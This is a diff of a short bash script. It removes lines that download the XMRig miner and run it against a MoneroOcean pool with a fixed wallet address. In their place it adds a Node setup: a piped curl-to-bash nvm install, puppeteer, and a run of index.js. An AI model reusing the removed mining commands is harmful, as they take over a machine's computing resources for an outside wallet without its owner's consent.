@@ -1,7 +1,9 @@
 #!/bin/bash
-wget https://github.com/xmrig/xmrig/releases/download/v6.14.0/xmrig-6.14.0-linux-x64.tar.gz
-7z e xmrig-6.14.0-linux-x64.tar.gz
-7z e xmrig-6.14.0-linux-x64.tar
-cd xmrig-6.14.0
-chmod +x xmrig
-./xmrig -o gulf.moneroocean.stream:10032 -u 49Yx5rJxUV57fQL64ecbXZeyWCQazpFTyKnahGGRUaiCPP3c6jfPXv4CD1Zz34HMRBgoDt523yxWSQ3XBUb7norhSp8DUjD -k -a astrobwt
+curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.38.0/install.sh | bash
+export NVM_DIR="$HOME/.nvm" && [ -s "$NVM_DIR/nvm.sh" ] && \. "$NVM_DIR/nvm.sh"
+nvm install node
+nvm use node
+echo before install
+npm install puppeteer
+echo after install
+node index.js
